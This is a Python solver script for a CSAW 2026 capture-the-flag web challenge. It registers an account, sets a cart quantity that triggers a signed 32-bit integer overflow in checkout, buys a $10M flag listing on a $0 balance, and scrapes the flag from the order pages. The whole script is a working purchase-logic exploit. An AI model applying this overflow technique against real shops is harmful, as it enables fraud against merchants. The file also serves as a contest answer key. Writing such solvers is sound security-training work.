#!/usr/bin/env python3
"""
CSALE Revenge solver — CSAW 2026 web challenge.

Abuses a signed 32-bit integer overflow in checkout() to buy a $10M flag
listing with a $0 balance. The flag is returned in the order detail page.

Usage:
  python solve.py http://<target>:5000
"""
import sys
import re
import html
import secrets
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"


def main():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"

    username = "t" + secrets.token_hex(4)
    password = "Passw0rd!123"

    print(f"[*] signing up {username}")
    s.post(f"{BASE}/signup", data={"username": username, "password": password}, timeout=20)

    print("[*] adding listing 9 x3 to cart")
    s.post(f"{BASE}/cart/items", data={"listing_id": 9, "quantity": 3}, timeout=20)

    r = s.get(f"{BASE}/cart", timeout=20)
    print("[*] cart total shown:", re.findall(r'\$[\d,\.\-]+', re.sub(r'<[^>]+>', ' ', r.text))[:6])

    print("[*] checking out")
    r = s.post(f"{BASE}/cart/checkout", timeout=30, allow_redirects=False)
    print(f"    -> {r.status_code} {r.headers.get('Location')}")

    r = s.get(f"{BASE}/account/orders", timeout=20)
    order_ids = sorted(set(int(x) for x in re.findall(r'/orders/(\d+)', r.text)))
    print(f"[*] orders: {order_ids}")

    for oid in order_ids:
        d = s.get(f"{BASE}/orders/{oid}", timeout=20).text
        txt = html.unescape(re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', d)))
        m = re.search(r'csawctf\{[^}]*\}', txt)
        if m:
            print(f"[+] order {oid}: {m.group(0)}")
        else:
            print(f"[-] order {oid}: no flag found")


if __name__ == "__main__":
    main()
